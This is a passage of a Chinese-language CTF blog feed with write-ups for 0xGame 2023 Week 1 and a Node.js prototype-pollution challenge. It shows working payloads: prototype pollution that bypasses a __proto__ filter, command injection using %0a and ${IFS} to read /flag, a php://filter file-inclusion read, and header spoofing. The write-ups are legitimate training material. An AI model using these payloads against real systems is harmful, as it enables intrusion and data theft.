function_">next</span>()<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/index.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/login.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/register.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)<br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username<br><br>        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span><br>        &#125;<br><br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login success&#x27;</span><br>        &#125;)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login failed&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)<br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users) &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register failed&#x27;</span><br>        &#125;)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        users[username] = password<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register success&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/profile&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">send</span>(&#123;<br>        <span class="hljs-string">&#x27;user&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>,<br>        <span class="hljs-string">&#x27;role&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span><br>    &#125;)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/sandbox&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>        <span class="hljs-keyword">let</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span><br>        <span class="hljs-keyword">let</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">let</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox)<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title function_">waf</span>(code)<br>            <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInContext</span>(code, context)<br>            res.<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-string">&#x27;result&#x27;</span>: result<br>            &#125;)<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            res.<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-string">&#x27;result&#x27;</span>: e.<span class="hljs-property">message</span><br>            &#125;)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;result&#x27;</span>: <span class="hljs-string">&#x27;Your role is not admin, so you can not run any code&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/logout&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-title function_">destroy</span>()<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;server start listening on :3000&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>先看和原型链污染有关的部分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>) <span class="hljs-comment">//解构赋值，从req.body对象中提取username和password属性值，并将它们分别赋值给变量username和password。</span><br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username<br><br>        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123; <span class="hljs-comment">//目的是拿到admin角色</span><br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span><br>        &#125;<br><span class="hljs-comment">//clone(req.body)看成merge(&#123;&#125;, req.body)。利用req.body污染admins即可</span><br></code></pre></td></tr></table></figure><p>在<code>POST</code>包中增加如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;&#125;<br><span class="hljs-comment">//__proto__被过滤，通过&quot;constructor&quot;: &#123;&quot;prototype&quot;: 绕过即可</span><br>&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;constructor&quot;</span>: &#123;<span class="hljs-string">&quot;prototype&quot;</span>: &#123;<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;&#125;<br><span class="hljs-comment">//存在admins.__proto__.test=123，username=&#x27;test&#x27;，使得username in admins成立</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/img/sb2.png" alt="sb2"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br><span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<br><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<br><span class="hljs-string">&quot;constructor&quot;</span>: &#123;<br><span class="hljs-string">&quot;prototype&quot;</span>: &#123;<br><span class="hljs-string">&quot;test&quot;</span>: <span class="hljs-string">&quot;123&quot;</span><br> &#125;<br> &#125;<br>&#125;<br>相当于：<br>&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;&#125;<br>&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;<br>&#123;<br><span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<br><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<br><span class="hljs-string">&quot;constructor&quot;</span>: &#123;<br><span class="hljs-string">&quot;prototype&quot;</span>: <span class="hljs-string">&quot;test&quot;</span><br>&#125;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_0xGame_Week1</title>
    <link href="/2023/09/18/ko1/"/>
    <url>/2023/09/18/ko1/</url>
    
    <content type="html"><![CDATA[<p>菜鸟的Write_up，只接触过web</p><span id="more"></span><h1 id="web部分"><a href="#web部分" class="headerlink" title="web部分"></a>web部分</h1><h3 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h3><p>根据题目想到可能是RCE：</p><p><img src="/img/ping1.png" alt="ping1"></p><p>看下源码发现提示：<code>&lt;!-- visit &#39;/api.php?source&#39; for hint --&gt;</code>,访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//;过滤可以用其它分隔符绕过，比如&amp;&amp;啥的</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//空格过滤可以用$&#123;IFS&#125;啥的绕过</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">// /过滤可以用反引号和printf配合绕过：`printf$&#123;IFS&#125;&quot;\57&quot;`</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//flag被过滤可以用通配符*绕过：fl*</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;                      <br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<span class="hljs-comment">//POST传IP</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>); <span class="hljs-comment">//对传过去的ip进行过滤</span><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid IP Address&#x27;</span>);<br>&#125;<span class="hljs-comment">//正则匹配IPv4地址的格式，可以用换行符%0a绕过</span><br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">&#x27; 2&gt;&amp;1&#x27;</span>);  <span class="hljs-comment">//命令执行</span><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>先利用ls看看当前目录下都有啥东西：</p><p><code>ip=127.0.0.1%0als</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">api<span class="hljs-selector-class">.php</span><br>index<span class="hljs-selector-class">.html</span><br>simple.css<br></code></pre></td></tr></table></figure><p>去根目录看看：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>als<span class="hljs-variable">$&#123;IFS&#125;</span>`printf<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&quot;\57&quot;</span>`<br><span class="hljs-attribute">bin</span><br><span class="hljs-attribute">boot</span><br><span class="hljs-attribute">dev</span><br><span class="hljs-attribute">etc</span><br><span class="hljs-attribute">flag</span><br></code></pre></td></tr></table></figure><p>cat读&#x2F;flag的内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>acat<span class="hljs-variable">$&#123;IFS&#125;</span>`printf<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&quot;\57&quot;</span>`fl*<br></code></pre></td></tr></table></figure><p>flag：0xGame{19c71976-d7d8-4ab8-9ea5-6ea3800f59f6}</p><h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-comment">//GET传a和b,POST传c,COOKIE超全局变量中name对应$name</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123; <span class="hljs-comment">//md5加密数组会返回null，null==null成立</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//c不能是个数字，可以在任意数字后加个字母达到目的</span><br>        &#125;                          <span class="hljs-comment">//c不能等于1024，结合后面的intval函数想到利用小数绕过，intval一个小数并不会遵循四舍五入原则</span><br>    &#125;                              <span class="hljs-comment">//提示flag在flag.php中，文件包含漏洞。因为后面会加.php所以直接传flag看看情况</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>综上：</p><p>GET<code>?a[]=1&amp;b[]=2</code>POST<code>c=1024.9a</code>并且<code>Cookie: name=flag</code></p><p>没反应，试了试目录穿越也没结果。想到用伪协议读flag.php：</p><p><code>Cookie: name=php://filter/convert.base64-encode/resource=flag</code></p><p>得到一串base64:</p><p><code>PD9waHAKCiRmbGFnID0gJzB4R2FtZXs0M2JiM2UyNC0wODI0LTQ4Y2ItOTVkMC1jNDcxNTQwYzA5NTN9JzsKCj8</code></p><p>解个码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;&#x27;</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>flag = 0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;</code></p><h3 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h3><p>第一关提示用<code>Get</code>方式传<code>query</code>，而且值必须是<code>ctf</code></p><p><code>?query=ctf</code></p><p>第二关提示用<code>POS</code>T传<code>action</code>,而且值必须是<code>getflag</code></p><p><code>action=getflag</code></p><p>第三关提示 <code>you are not admin</code>，想到这东西可能在cookie放着，burpsuite抓包：发现<code>Cookie: role=guest</code>，改成<code>Cookie: role=admin</code></p><p>第四关提示<code>Error: Only allow local IP</code>，还是抓包加个XFF头：</p><p><code>X-Forwarded-For:127.0.0.1</code></p><p>第五关提示<code>Error: You are not using HarmonyOS Browser 😡</code>，还是抓包改User-Agent：</p><p><code>User-Agent:HarmonyOS Browser</code></p><p>第六关提示必须来自<code>ys.mihoyo.com</code>，抓包改Referer：</p><p><code>Referer: ys.mihoyo.com</code></p><p>得到Flag:<code>0xGame&#123;2c1a10fb-921e-4250-820f-5ce36940b8b5&#125;</code></p><h3 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="[Week 1] repo_leak"></a>[Week 1] repo_leak</h3><p>进环境后发现是个博客主页，里面有个Notice博文写了这么个东西：</p><p><code>There is noting here. Using Git for version control</code></p><p>结合题目想到可能是敏感信息泄露，而且访问<code>/.git</code>并没有弹404</p><p>用dirsearch扫了一下，发现大量.git文件，猜测git泄露：</p><p><img src="/img/repo1.png" alt="repo1"></p><p>GitHack弄它：</p><p><code>python2 GitHack.py http://120.27.148.152:50013/.git</code></p><p><img src="/img/repo2.png" alt="repo2"></p><p>在存储扫描结果的文件夹利用<code>git log</code>查看每个commit都干了啥：</p><p><img src="/img/rerpo3.png" alt="rerpo3"></p><p>看到了三个版本，发现有个 <code>add post : flag</code></p><p>对比下版本拿flag:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git diff ea44cb8ff3c27bb1db6d3acc4c875144d295045d 8a5b670558921bd232d75b29542492f00698298b<br></code></pre></td></tr></table></figure><p><img src="/img/repo4.png" alt="repo4"></p><p><code>0xGame&#123;3fc49725-23b5-4f28-8c64-16a3459b67b7&#125;</code></p><h3 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p>明明是签到却是最后一个解出来的:(运气好被我乱点点出来了</p><p><img src="/img/ok1.png" alt="ok1"></p><p><code>flag：0xGame&#123;c788fa80-2184-429f-b410-48cb8e2de0ff&#125;</code></p><h1 id="MISC部分"><a href="#MISC部分" class="headerlink" title="MISC部分"></a>MISC部分</h1><h3 id="Week-1-shark-shark"><a href="#Week-1-shark-shark" class="headerlink" title="[Week 1] shark shark"></a>[Week 1] shark shark</h3><p>第一次做杂项的题 :) 下载附件后用wireshark打开，发现好像是个登录过程？登录后执行了一些命令 ：</p><p><img src="/img/shark.png" alt="shark"></p><p>直接搜<code>0xGame</code>和<code>flag</code>都没结果。。但在返回包里有这么个东西？</p><p><img src="/img/shark2.png" alt="shark2"></p><p>把data拿出来拿去问了CHATGPT:)说这是一个ZIP文件的十六进制表示，要把它解码成二进制数据再解压。发现有个<code>flag.txt</code>文件，但需要密码：</p><p><img src="/img/shark3.png" alt="shark3"></p><p>想到刚才追踪流的时候有个very_safe_password，尝试了一下得到了flag：<code>0xGame&#123;7a504dab-ada6-4c41-adb3-0d1530098cd4&#125;</code></p><h3 id="Week-1-hide-and-seek"><a href="#Week-1-hide-and-seek" class="headerlink" title="[Week 1] hide and seek"></a>[Week 1] hide and seek</h3><p>根据题目提示和师傅在群里的提示，下载了<code>stegseek</code>这个工具，弄一下就得到flag了：</p><p><img src="/img/hiideandseek.png" alt="hiideandseek"></p><h3 id="Week-1-least-and-most"><a href="#Week-1-least-and-most" class="headerlink" title="[Week 1] least and most"></a>[Week 1] least and most</h3><p>题目提示是隐写，网上下了个叫<code>stegsolve</code>的工具，一通乱点得到了：</p><p><code>0xGame&#123;l sb_com</code>和<code>bined_wi th_msb&#125;</code>。</p><h3 id="Week-1-signin-1"><a href="#Week-1-signin-1" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p><code>R0I0RU9ZTE5NVjVWT1pMTU1NWUcyWks3S1JYVjZNRFlJNVFXMlpKU0dBWkRHSUpCUFU9PT09PT0=</code></p><p>看着像base64，先解码看看啥情况：</p><p><code>GB4EOYLNMV5VOZLMMMYG2ZK7KRXV6MDYI5QW2ZJSGAZDGIJBPU======</code></p><p>再用base32解一下：</p><p><code>0xGame&#123;Welc0me_To_0xGame2023!!&#125;</code></p><h3 id="Week-1-重生之我在教学楼打cs"><a href="#Week-1-重生之我在教学楼打cs" class="headerlink" title="[Week 1] 重生之我在教学楼打cs"></a>[Week 1] 重生之我在教学楼打cs</h3><p>下载发现是个bsp文件，根据师傅的提示发现这东西是个cs1.6的地图文件，重命名一下放到<code>cstrike</code>下的<code>maps</code>文件夹里，然后cs1.6直接进地图。在鼎右下角找到了一串小字：</p><p><code>0xGame&#123;CS_very_good&#125;</code></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="Week-1-找不到且不对劲的flag"><a href="#Week-1-找不到且不对劲的flag" class="headerlink" title="[Week 1] 找不到且不对劲的flag"></a>[Week 1] 找不到且不对劲的flag</h3><p><code> nc 8.130.35.16 51000</code>后<code>ls</code>,发现有个<code>flag</code>但<code>cat</code>读了发现是假的:</p><p><img src="/img/secret.png" alt="secret"></p><p><code>ls -al</code>发现有个<code>.secret</code>文件，<code>cat</code>读了下得到了<code>flag</code></p><p><img src="/img/pwn1.png" alt="pwn1"></p><h1 id="Crypto部分"><a href="#Crypto部分" class="headerlink" title="Crypto部分"></a>Crypto部分</h1><h3 id="Week-1-Vigenere"><a href="#Week-1-Vigenere" class="headerlink" title="[Week 1] Vigenere"></a>[Week 1] Vigenere</h3><p>题目描述：密文：0dGmqk{79ap4i0522g0a67m6i196he52357q60f} 古老而神秘的加密方式？</p><p><code>flag</code>格式<code>0xGame&#123;xxxx&#125;</code>，现在开头是<code>0dGmqk</code>，猜测密钥前四位是<code>game</code>?，先在线解密看下结果：</p><p><img src="/img/vig.png" alt="vig"></p><p>得到flag。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF做题记录_1</title>
    <link href="/2023/09/17/helloworld/"/>
    <url>/2023/09/17/helloworld/</url>
    
    <content type="html"><![CDATA[<p>一些做题记录</p><span id="more"></span><hr><p>本人的一点拙见。</p><p>一只网络安全菜鸟–(˙&lt;&gt;˙)&#x2F;–<br>写博客主要是想记录一下自己的学习过程，过两年毕业了也能回头看看自己都学了些啥东西。<br>由于本人水平有限内容难免有错误、疏漏、逻辑不清、让人看不懂等各种问题，恳请大家批评指正<br>如果我写的东西能对你有一点点帮助，那真是再好不过了😀。</p><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a><strong>shrine</strong></h2><p>进去直接给了一大坨代码，简单捋一下：<br><img src="/img/c1.png" alt="c1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask <br><span class="hljs-keyword">import</span> os <br>app = flask.Flask(__name__)<br>app.config[<span 